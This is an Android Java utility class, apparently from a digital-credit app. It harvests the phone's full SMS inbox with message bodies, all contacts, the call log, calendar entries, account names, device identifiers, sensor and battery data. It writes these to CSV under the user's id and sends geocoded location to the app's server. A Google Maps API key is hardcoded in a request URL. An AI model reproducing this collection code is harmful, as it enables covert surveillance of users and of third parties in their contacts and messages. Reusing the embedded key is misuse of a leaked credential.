package com.example.administrator.digitalcredit.Utils;

import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.hardware.SensorManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.os.Build;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;


import com.example.administrator.digitalcredit.Model.MobileBean;
import com.example.administrator.digitalcredit.Model.MobileLocation;
import com.example.administrator.digitalcredit.client.ApiClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import retrofit2.Call;
import retrofit2.Callback;


public class Datapoints {
    private static Datapoints datapoints;
    private Datapoints() {
    }

    public static Datapoints getInstance() {
        if(datapoints==null){
            datapoints=new Datapoints();
        }
        return datapoints;
    }

    @SuppressLint("NewApi")
    public void sms(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        try {
            int catId= ApiClient.getInstance().getCategory("sms").execute().body().intValue();
            list = new ArrayList<>();

            cursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI/*Uri.parse("content://sms/inbox")*/, null/*new String[]{"body", "error_code", "rcs_message_id", "rcs_message_type"}*/,
                    /*"date BETWEEN "+startDate+" AND "+endDate*/ null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    recId++;
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        MobileBean bean;
                        if (cursor.getColumnName(i).equalsIgnoreCase("body")) {
                            String patternToMatch = "[\\\\!\"#$%&()*+/;<=>?@\\[\\]^_{|}~|\\s]+";
                            Pattern p = Pattern.compile(patternToMatch);
                            Matcher m = p.matcher(cursor.getString(i));
                            if (m.find()) {
                                bean = new MobileBean(userId,catId,recId, cursor.getColumnName(i), m.replaceAll(" "));
                            } else {
                                bean = new MobileBean(userId,catId,recId, cursor.getColumnName(i), m.replaceAll(" "));
                            }
                        } else {
                            bean = new MobileBean(userId,catId,recId, cursor.getColumnName(i), cursor.getString(i));
                        }
                        list.add(bean);
                    }
                } while (cursor.moveToNext());
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void contact(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("contact").execute().body().intValue();
            list = new ArrayList<>();

            cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    recId++;
                    for (int i = 0; i < cursor.getColumnCount(); i++) {

                        bean = new MobileBean(userId, catId, recId, cursor.getColumnName(i).trim(), String.valueOf(cursor.getString(i)).trim());
                        list.add(bean);

                    }
                } while (cursor.moveToNext());
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @SuppressLint("MissingPermission")
    public void call(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("calls").execute().body().intValue();
            list = new ArrayList<>();

            cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    recId++;
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        bean = new MobileBean(userId,catId,recId, cursor.getColumnName(i), cursor.getString(i));
                        list.add(bean);
                    }
                } while (cursor.moveToNext());
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void sensor(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("sensor").execute().body().intValue();
            list = new ArrayList<>();

            SensorManager sensorManager = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
            List<android.hardware.Sensor> sensors = sensorManager.getSensorList(android.hardware.Sensor.TYPE_ALL);
            recId++;
            for (int i = 0; i < sensors.size(); i++) {
                bean = new MobileBean(userId,catId,recId, "Sensor", sensors.toString());
                list.add(bean);
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void deviceInfo(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("device_info").execute().body().intValue();
            list = new ArrayList<>();

            Map<String, String> map = new HashMap<>();
            recId++;
            map.put("SERIAL", Build.SERIAL);
            list.add(new MobileBean(userId,catId,recId,"SERIAL", Build.SERIAL));
            map.put("MODEL", Build.MODEL);
            list.add(new MobileBean(userId,catId,recId,"MODEL", Build.MODEL));
            map.put("ID", Build.ID);
            list.add(new MobileBean(userId,catId,recId,"ID", Build.ID));
            map.put("Manufacture", Build.MANUFACTURER);
            list.add(new MobileBean(userId,catId,recId,"SERIAL", Build.MANUFACTURER));
            map.put("brand", Build.BRAND);
            list.add(new MobileBean(userId,catId,recId,"brand", Build.BRAND));
            map.put("type", Build.TYPE);
            list.add(new MobileBean(userId,catId,recId,"type", Build.TYPE));
            map.put("user", Build.USER);
            list.add(new MobileBean(userId,catId,recId,"user", Build.USER));
            map.put("BASE", String.valueOf(Build.VERSION_CODES.BASE));
            list.add(new MobileBean(userId,catId,recId,"BASE", String.valueOf(Build.VERSION_CODES.BASE)));
            map.put("INCREMENTAL", Build.VERSION.INCREMENTAL);
            list.add(new MobileBean(userId,catId,recId,"INCREMENTAL", Build.VERSION.INCREMENTAL));
            map.put("SDK", Build.VERSION.SDK);
            list.add(new MobileBean(userId,catId,recId,"SDK", Build.VERSION.SDK));
            map.put("BOARD", Build.BOARD);
            list.add(new MobileBean(userId,catId,recId,"BOARD", Build.BOARD));
            map.put("BRAND", Build.BRAND);
            list.add(new MobileBean(userId,catId,recId,"BRAND", Build.BRAND));
            map.put("HOST", Build.HOST);
            list.add(new MobileBean(userId,catId,recId,"HOST", Build.HOST));
            map.put("FINGERPRINT", Build.FINGERPRINT);
            list.add(new MobileBean(userId,catId,recId,"FINGERPRINT", Build.FINGERPRINT));
            map.put("VersionCode", Build.VERSION.RELEASE);
            list.add(new MobileBean(userId,catId,recId,"VersionCode", Build.VERSION.RELEASE));
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void account(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;

        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("account").execute().body().intValue();
            list = new ArrayList<>();

            AccountManager accountManager = AccountManager.get(context);
            android.accounts.Account[] acc = accountManager.getAccounts();
            recId++;
            for (int i = 0; i < acc.length; i++) {
                bean=new MobileBean(userId,catId,recId,acc[i].name,acc[i].toString());
                list.add(bean);
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @SuppressLint("MissingPermission")
    public void calendarcontractEvents(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("calender_event").execute().body().intValue();
            list = new ArrayList<>();

            cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, null,
                    null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception

                do {
                    recId++;

                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        bean = new MobileBean(userId,catId, recId, cursor.getColumnName(i), cursor.getString(i));
                        list.add(bean);
                    }
                } while (cursor.moveToNext());

            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @SuppressLint("MissingPermission")
    public void calendarcontractReminder(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;

        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        Cursor cursor = null;
        List<MobileBean> list;
        MobileBean bean;
        try {
            int catId= ApiClient.getInstance().getCategory("calender_reminder").execute().body().intValue();
            list = new ArrayList<>();

            cursor = context.getContentResolver().query(CalendarContract.Reminders.CONTENT_URI, null,
                    null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception

                do {
                    recId++;

                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        bean = new MobileBean(userId,catId, recId, cursor.getColumnName(i), cursor.getString(i));
                        list.add(bean);
                    }
                } while (cursor.moveToNext());

            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @SuppressLint("MissingPermission")
    public void battery(final Context context, final Helper helper, final PrintWriter printWriter) {
        int recId=0;
        int userId= Integer.parseInt(helper.getSession(context).get("user_id").toString());
        List<MobileBean> list;

        try {
            int catId= ApiClient.getInstance().getCategory("battery").execute().body().intValue();
            list = new ArrayList<>();

            recId++;
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
            for(int i=0;i<batteryStatus.getExtras().keySet().toArray().length;i++) {
                list.add(new MobileBean(userId,catId,recId,batteryStatus.getExtras().keySet().toArray()[i].toString()
                        ,batteryStatus.getExtras().get(batteryStatus.getExtras().keySet().toArray()[i].toString()).toString()
                ));
            }
            if (list.size() > 0) {
                helper.OpenCsv(list,printWriter);

            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void location(final Context context, final Location location, final int recId, final int userId, Helper helper) {

        ApiClient.getInstance().getCategory("location").enqueue(new Callback<Integer>() {
            @SuppressLint("NewApi")
            @Override
            public void onResponse(Call<Integer> call, retrofit2.Response<Integer> response) {
                if(response.isSuccessful() && response.code()==200){
                    try{
                        final SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-DD-MM");
                        simpleDateFormat.setTimeZone(TimeZone.getDefault());
                        Geocoder geocoder=new Geocoder(context, Locale.getDefault());
                        MobileLocation bean = null;
                        OkHttpClient client = new OkHttpClient();
                        final List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                        Request request_place = new Request.Builder()
                                .url("https://maps.googleapis.com/maps/api/place/nearbysearch/json?location="+String.valueOf(location.getLatitude())+","+String.valueOf(location.getLongitude())+"&radius=10&key=AIzaSyAMly2uKnHT14gr3sYXOKSrytvw25SlcsA")
                                .build();

                        Response response_place = client.newCall(request_place).execute();
                        JSONObject object_place=new JSONObject(response_place.body().string());
                        JSONArray array_place=object_place.getJSONArray("results");

                        bean=new MobileLocation();
                        bean.setUserId(userId);
                        bean.setRecId(String.valueOf(recId));
                        bean.setAccuracy(location.getAccuracy());
                        bean.setAddress(addresses.get(0).getAddressLine(0));
                        bean.setAltitude(location.getAltitude());
                        bean.setBearing(location.getBearing());
                        bean.setElapseTime(location.getElapsedRealtimeNanos());
                        bean.setLatitude(location.getLatitude());
                        bean.setLongitude(location.getLongitude());
                        bean.setProvider(location.getProvider());
                        bean.setSpead(location.getSpeed());
                        bean.setLocTime(location.getTime());
                        bean.setRadius(10);
                        if(addresses!=null){
                            bean.setAddress(addresses.get(0).getAddressLine(0));
                            bean.setKnownNameLoc(addresses.get(0).getFeatureName());
                            bean.setPlaceNameLoc(array_place.getJSONObject(1).getString("name"));
                        }
                        ApiClient.getInstance().setLocation(bean).enqueue(new Callback<Long>() {
                            @Override
                            public void onResponse(Call<Long> call, retrofit2.Response<Long> response) {
                                if(response.code()==200 && response.isSuccessful()){
                                    Log.e("Location------->",response.body().toString());
                                }
                            }

                            @Override
                            public void onFailure(Call<Long> call, Throwable t) {

                            }
                        });
                    }catch (JSONException e){
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }

            @Override
            public void onFailure(Call<Integer> call, Throwable t) {

            }
        });
    }
}
